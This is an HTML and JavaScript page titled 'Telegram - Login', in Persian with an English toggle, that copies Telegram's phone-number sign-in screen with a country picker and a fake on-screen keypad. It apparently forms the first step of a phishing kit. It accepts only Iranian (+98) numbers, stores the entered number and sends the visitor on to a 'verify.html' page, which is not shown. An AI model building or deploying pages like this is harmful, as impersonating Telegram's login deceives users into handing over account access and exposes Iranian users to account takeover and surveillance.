<!DOCTYPE html>
<html lang="fa" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Telegram - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
            -webkit-touch-callout: none;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            color: #000000;
            height: 100vh;
            height: 100dvh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            direction: ltr;
        }

        .top-header {
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
            padding: 16px 24px 0 24px;
            display: flex;
            justify-content: flex-end;
            align-items: center;
        }

        .lang-switcher {
            background: #f1f2f6;
            border: none;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
            color: #2481cc;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
        }

        .lang-switcher:active {
            transform: scale(0.95);
            background: #e2e3eb;
        }

        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 24px 0 24px;
            position: relative;
            max-width: 420px;
            width: 100%;
            margin: 0 auto;
            animation: fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .title {
            font-size: 24px;
            font-weight: 600;
            letter-spacing: -0.3px;
            margin-bottom: 8px;
            text-align: center;
            color: #000;
        }

        .subtitle {
            font-size: 14px;
            color: #8e8e93;
            text-align: center;
            line-height: 1.4;
            max-width: 300px;
            margin-bottom: 35px;
        }

        .form-area {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .country-field {
            width: 100%;
            height: 52px;
            border: 1px solid #e0e0e3;
            border-radius: 12px;
            padding: 0 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #ffffff;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
        }

        .country-field:active {
            background: #f2f2f7;
            transform: scale(0.98);
        }

        .country-selected-view {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .country-flag-icon {
            font-size: 20px;
            line-height: 1;
        }

        .country-name-text {
            font-size: 17px;
            color: #000;
            font-weight: 400;
        }

        .country-placeholder {
            font-size: 17px;
            color: #8e8e93;
            font-weight: 400;
        }

        .country-arrow {
            color: #b0b0b5;
            font-size: 14px;
            font-weight: 600;
        }

        .phone-field-box {
            width: 100%;
            height: 60px;
            border: 1.5px solid #2481cc;
            border-radius: 12px;
            padding: 6px 14px;
            background: #ffffff;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
            box-shadow: 0 0 0 3px rgba(36, 129, 204, 0.12);
        }

        .phone-label-small {
            font-size: 11px;
            color: #2481cc;
            font-weight: 500;
            margin-bottom: 2px;
        }

        .phone-input-row {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .plus-char {
            font-size: 17px;
            color: #000;
            font-weight: 400;
        }

        .fake-input-display {
            font-size: 17px;
            color: #000;
            font-weight: 400;
            outline: none;
            background: transparent;
            border: none;
            cursor: pointer;
        }

        .phone-code-input {
            width: 36px;
        }

        .phone-val-input {
            flex: 1;
            letter-spacing: 0.5px;
        }

        .phone-val-input:empty:before {
            content: attr(data-placeholder);
            color: #d1d1d6;
        }

        .cursor-blink {
            display: inline-block;
            width: 2px;
            height: 18px;
            background-color: #2481cc;
            margin-left: 1px;
            vertical-align: middle;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            50.1%, 100% { opacity: 0; }
        }

        .fab-next {
            position: absolute;
            right: 24px;
            bottom: 260px;
            width: 54px;
            height: 54px;
            background: #2481cc;
            border: none;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(36, 129, 204, 0.35);
            transition: transform 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275), background 0.2s;
            z-index: 10;
        }

        .fab-next:hover {
            transform: scale(1.06);
            background: #1b6cae;
        }

        .fab-next:active {
            transform: scale(0.92);
        }

        .fab-next svg {
            width: 22px;
            height: 22px;
            stroke: #ffffff;
            stroke-width: 2.5;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .ios-keyboard {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: #f1f2f6;
            padding: 6px 4px calc(6px + env(safe-area-inset-bottom, 0px)) 4px;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 6px;
            z-index: 20;
            border-top: 1px solid #d8d8dc;
            box-shadow: 0 -4px 20px rgba(0,0,0,0.06);
        }

        .key-btn {
            background: #ffffff;
            border-radius: 6px;
            height: 48px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.15);
            transition: background 0.08s ease, transform 0.06s ease;
        }

        .key-btn:active {
            background: #c5c7d0;
            transform: scale(0.96);
            box-shadow: none;
        }

        .k-num {
            font-size: 23px;
            font-weight: 400;
            color: #000;
            line-height: 1;
        }

        .k-sub {
            font-size: 9px;
            font-weight: 700;
            color: #8e8e93;
            letter-spacing: 0.8px;
            margin-top: 2px;
            text-transform: uppercase;
        }

        .k-plus {
            font-size: 11px;
            color: #8e8e93;
            margin-top: 1px;
        }

        .modal-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.45);
            backdrop-filter: blur(3px);
            z-index: 100;
            display: flex;
            align-items: flex-end;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0.3s ease;
        }

        .modal-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .modal-container {
            background: #ffffff;
            width: 100%;
            height: 82vh;
            border-top-left-radius: 24px;
            border-top-right-radius: 24px;
            display: flex;
            flex-direction: column;
            transform: translateY(100%);
            transition: transform 0.38s cubic-bezier(0.16, 1, 0.3, 1);
            overflow: hidden;
        }

        .modal-overlay.active .modal-container {
            transform: translateY(0);
        }

        .modal-header {
            padding: 18px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #efeff4;
        }

        .modal-title {
            font-size: 17px;
            font-weight: 600;
        }

        .modal-done-btn {
            background: none;
            border: none;
            color: #2481cc;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            padding: 4px 8px;
        }

        .search-wrapper {
            padding: 12px 16px;
        }

        .search-box {
            width: 100%;
            height: 40px;
            background: #efeff4;
            border: none;
            border-radius: 10px;
            padding: 0 14px;
            font-size: 15px;
            outline: none;
            color: #000;
        }

        .countries-list {
            flex: 1;
            overflow-y: auto;
            padding: 0 16px;
        }

        .country-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 13px 8px;
            border-bottom: 1px solid #f2f2f6;
            cursor: pointer;
        }

        .country-item:active {
            background: #f0f0f5;
        }
    </style>
</head>
<body>

    <div class="top-header">
        <button class="lang-switcher" id="langToggleBtn">English</button>
    </div>

    <div class="main-content">
        <h1 class="title" id="pageTitle">شماره تلفن شما</h1>
        <p class="subtitle" id="pageSubtitle">لطفاً کد کشور خود را تأیید کرده و شماره تلفن خود را وارد کنید.</p>

        <div class="form-area">
            <div class="country-field" id="openCountryModal">
                <div class="country-selected-view" id="selectedCountryDisplay">
                    <span class="country-placeholder" id="countryPlaceholder">کشور</span>
                </div>
                <span class="country-arrow">❯</span>
            </div>

            <div class="phone-field-box">
                <span class="phone-label-small" id="boxLabel">شماره تلفن</span>
                <div class="phone-input-row">
                    <span class="plus-char">+</span>
                    <div class="fake-input-display phone-code-input" id="codeDisplay" onclick="setActiveField('code')">98</div>
                    <div class="fake-input-display phone-val-input" id="numDisplay" data-placeholder="912 345 6789" onclick="setActiveField('phone')"><span class="cursor-blink"></span></div>
                </div>
            </div>
        </div>

        <button class="fab-next" id="nextBtn">
            <svg viewBox="0 0 24 24">
                <path d="M5 12h14M12 5l7 7-7 7" />
            </svg>
        </button>
    </div>

    <div class="ios-keyboard">
        <div class="key-btn" data-v="1"><span class="k-num">1</span></div>
        <div class="key-btn" data-v="2"><span class="k-num">2</span><span class="k-sub">ABC</span></div>
        <div class="key-btn" data-v="3"><span class="k-num">3</span><span class="k-sub">DEF</span></div>
        <div class="key-btn" data-v="4"><span class="k-num">4</span><span class="k-sub">GHI</span></div>
        <div class="key-btn" data-v="5"><span class="k-num">5</span><span class="k-sub">JKL</span></div>
        <div class="key-btn" data-v="6"><span class="k-num">6</span><span class="k-sub">MNO</span></div>
        <div class="key-btn" data-v="7"><span class="k-num">7</span><span class="k-sub">PQRS</span></div>
        <div class="key-btn" data-v="8"><span class="k-num">8</span><span class="k-sub">TUV</span></div>
        <div class="key-btn" data-v="9"><span class="k-num">9</span><span class="k-sub">WXYZ</span></div>
        <div class="key-btn" style="visibility: hidden; pointer-events: none;"></div>
        <div class="key-btn" data-v="0"><span class="k-num">0</span><span class="k-plus">+</span></div>
        <div class="key-btn" data-v="del">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
                <line x1="18" y1="9" x2="12" y2="15"></line>
                <line x1="12" y1="9" x2="18" y2="15"></line>
            </svg>
        </div>
    </div>

    <div class="modal-overlay" id="countryModal">
        <div class="modal-container">
            <div class="modal-header">
                <span class="modal-title" id="modalTitleText">انتخاب کشور</span>
                <button class="modal-done-btn" id="closeModalBtn">تایید</button>
            </div>
            <div class="search-wrapper">
                <input type="text" class="search-box" id="searchCountry" placeholder="جستجو...">
            </div>
            <div class="countries-list" id="countriesList"></div>
        </div>
    </div>

    <script>
        let currentLang = 'fa';

        const translations = {
            fa: {
                title: 'شماره تلفن شما',
                subtitle: 'لطفاً کد کشور خود را تأیید کرده و شماره تلفن خود را وارد کنید.',
                country: 'کشور',
                phoneLabel: 'شماره تلفن',
                codeLabel: 'کد کشور',
                modalTitle: 'انتخاب کشور',
                doneBtn: 'تایید',
                searchPlaceholder: 'جستجو...',
                nextLangBtn: 'English',
                errorIran: 'لطفاً فقط از شماره تلفن‌های ایران (+98) استفاده کنید.'
            },
            en: {
                title: 'Your phone number',
                subtitle: 'Please confirm your country code and enter your phone number.',
                country: 'Country',
                phoneLabel: 'Phone number',
                codeLabel: 'Country code',
                modalTitle: 'Choose a country',
                doneBtn: 'Done',
                searchPlaceholder: 'Search',
                nextLangBtn: 'فارسی',
                errorIran: 'Please use Iranian phone numbers (+98) only.'
            }
        };

        const countries = [
            { name: 'Iran', code: '98', flag: '🇮🇷' },
            { name: 'United States', code: '1', flag: '🇺🇸' },
            { name: 'United Kingdom', code: '44', flag: '🇬🇧' },
            { name: 'Germany', code: '49', flag: '🇩🇪' },
            { name: 'Turkey', code: '90', flag: '🇹🇷' },
            { name: 'Afghanistan', code: '93', flag: '🇦🇫' },
            { name: 'United Arab Emirates', code: '971', flag: '🇦🇪' },
            { name: 'Canada', code: '1', flag: '🇨🇦' },
            { name: 'Iraq', code: '964', flag: '🇮🇶' }
        ];

        let phoneText = '';
        let codeText = '98';
        let activeField = 'phone';

        const numDisplay = document.getElementById('numDisplay');
        const codeDisplay = document.getElementById('codeDisplay');
        const selectedCountryDisplay = document.getElementById('selectedCountryDisplay');
        const boxLabel = document.getElementById('boxLabel');
        const countryPlaceholder = document.getElementById('countryPlaceholder');
        
        const pageTitle = document.getElementById('pageTitle');
        const pageSubtitle = document.getElementById('pageSubtitle');
        const langToggleBtn = document.getElementById('langToggleBtn');
        const modalTitleText = document.getElementById('modalTitleText');
        const closeModalBtn = document.getElementById('closeModalBtn');
        const searchCountry = document.getElementById('searchCountry');
        const nextBtn = document.getElementById('nextBtn');

        const countryModal = document.getElementById('countryModal');
        const openCountryModal = document.getElementById('openCountryModal');
        const countriesList = document.getElementById('countriesList');

        function updateTexts() {
            const t = translations[currentLang];
            pageTitle.textContent = t.title;
            pageSubtitle.textContent = t.subtitle;
            countryPlaceholder.textContent = t.country;
            langToggleBtn.textContent = t.nextLangBtn;
            modalTitleText.textContent = t.modalTitle;
            closeModalBtn.textContent = t.doneBtn;
            searchCountry.placeholder = t.searchPlaceholder;
            boxLabel.textContent = activeField === 'phone' ? t.phoneLabel : t.codeLabel;
        }

        langToggleBtn.addEventListener('click', () => {
            currentLang = currentLang === 'fa' ? 'en' : 'fa';
            updateTexts();
        });

        function updateDisplay() {
            numDisplay.innerHTML = (phoneText === '' ? '' : phoneText) + '<span class="cursor-blink"></span>';
            codeDisplay.textContent = codeText;
            const t = translations[currentLang];
            boxLabel.textContent = activeField === 'phone' ? t.phoneLabel : t.codeLabel;
        }

        window.setActiveField = function(field) {
            activeField = field;
            updateDisplay();
        }

        function setCountry(country) {
            codeText = country.code;
            selectedCountryDisplay.innerHTML = `
                <span class="country-flag-icon">${country.flag}</span>
                <span class="country-name-text">${country.name}</span>
            `;
            countryModal.classList.remove('active');
            updateDisplay();
        }

        setCountry(countries[0]);

        openCountryModal.addEventListener('click', () => {
            countryModal.classList.add('active');
            renderList(countries);
            searchCountry.value = '';
        });

        closeModalBtn.addEventListener('click', () => {
            countryModal.classList.remove('active');
        });

        countryModal.addEventListener('click', (e) => {
            if (e.target === countryModal) countryModal.classList.remove('active');
        });

        function renderList(list) {
            countriesList.innerHTML = '';
            list.forEach(c => {
                const item = document.createElement('div');
                item.className = 'country-item';
                item.innerHTML = `
                    <div style="display: flex; align-items: center; gap: 12px;">
                        <span style="font-size: 22px;">${c.flag}</span>
                        <span style="font-size: 16px; color: #000;">${c.name}</span>
                    </div>
                    <span style="color: #8e8e93; font-size: 15px;">+${c.code}</span>
                `;
                item.addEventListener('click', () => setCountry(c));
                countriesList.appendChild(item);
            });
        }

        searchCountry.addEventListener('input', (e) => {
            const query = e.target.value.toLowerCase();
            const filtered = countries.filter(c => c.name.toLowerCase().includes(query) || c.code.includes(query));
            renderList(filtered);
        });

        nextBtn.addEventListener('click', () => {
            if (codeText !== '98') {
                alert(translations[currentLang].errorIran);
                return;
            }
            if (phoneText.length < 9) {
                alert(currentLang === 'fa' ? 'لطفاً شماره تلفن را به صورت کامل وارد کنید.' : 'Please enter a valid phone number.');
                return;
            }
            
            // ذخیره شماره در حافظه و انتقال به صفحه بعد
            localStorage.setItem('userPhone', '+' + codeText + phoneText);
            window.location.href = 'verify.html';
        });

        document.querySelectorAll('.key-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const val = btn.getAttribute('data-v');
                if (!val) return;
                
                if (val === 'del') {
                    if (activeField === 'phone') {
                        phoneText = phoneText.slice(0, -1);
                    } else {
                        codeText = codeText.slice(0, -1);
                    }
                } else {
                    if (activeField === 'phone') {
                        if (phoneText.length < 15) phoneText += val;
                    } else {
                        if (codeText.length < 4) codeText += val;
                    }
                }
                updateDisplay();
            });
        });

        updateTexts();
        updateDisplay();
    </script>
</body>
</html>
